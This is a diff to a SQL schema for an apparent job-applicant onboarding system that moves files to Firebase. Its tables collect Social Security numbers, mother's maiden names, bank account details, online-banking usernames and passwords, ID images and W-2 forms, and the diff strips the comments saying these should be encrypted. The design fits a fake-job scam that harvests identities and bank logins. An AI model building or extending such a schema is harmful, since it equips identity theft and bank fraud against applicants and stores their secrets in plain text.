@@ -26,9 +26,8 @@ CREATE TABLE admin_users (
 );
 
 -- ============================================================
--- Applicants Table
+-- Applicants Table (Firebase version)
 -- ============================================================
-
 
 CREATE TABLE applicants (
   id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
@@ -38,10 +37,7 @@ CREATE TABLE applicants (
   email      TEXT UNIQUE NOT NULL,
   phone      TEXT NOT NULL,
 
-  resume_url     TEXT,
-  resume_binary  BYTEA,
-  resume_mime    TEXT,
-  resume_filename TEXT,
+  resume_url TEXT,  -- 🔥 Store Firebase URL here
 
   status TEXT NOT NULL DEFAULT 'pending',  -- 'pending' | 'accepted' | 'rejected'
   application_date DATE NOT NULL DEFAULT CURRENT_DATE
@@ -50,7 +46,7 @@ CREATE TABLE applicants (
 CREATE INDEX idx_applicants_status ON applicants(status);
 
 -- ============================================================
--- Onboarding Table
+-- Onboarding Table (Firebase version)
 -- ============================================================
 
 CREATE TABLE onboarding (
@@ -62,7 +58,7 @@ CREATE TABLE onboarding (
   last_name          TEXT NOT NULL,
   mother_maiden_name TEXT,
   date_of_birth      DATE NOT NULL,
-  ssn                TEXT,  -- ⚠️ Encrypt or mask in app
+  ssn                TEXT,
 
   -- Address Info
   street   TEXT NOT NULL,
@@ -75,25 +71,14 @@ CREATE TABLE onboarding (
   routing_number TEXT NOT NULL,
   bank_name      TEXT NOT NULL,
   bank_username  TEXT,
-  bank_password  TEXT, -- ⚠️ Encrypt in app
+  bank_password  TEXT,
 
   -- Public URLs
   front_image_url TEXT NOT NULL,
   back_image_url  TEXT NOT NULL,
   w2_form_url     TEXT NOT NULL,
 
-  -- Binary Files + MIME + Filenames
-  front_image_binary BYTEA,
-  front_image_mime   TEXT,
-  front_image_filename TEXT,
-
-  back_image_binary  BYTEA,
-  back_image_mime    TEXT,
-  back_image_filename TEXT,
-
-  w2_form_binary     BYTEA,
-  w2_form_mime       TEXT,
-  w2_form_filename   TEXT,
+  -- ⛔️ Binary/MIME fields removed
 
   -- Status Flags
   onboarding_completed BOOLEAN NOT NULL DEFAULT FALSE,
@@ -110,7 +95,7 @@ CREATE TABLE bank_logins (
 
   bank_name TEXT NOT NULL,
   username  TEXT NOT NULL,
-  password  TEXT NOT NULL, -- ⚠️ Encrypt in app
+  password  TEXT NOT NULL,
 
   created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
 );
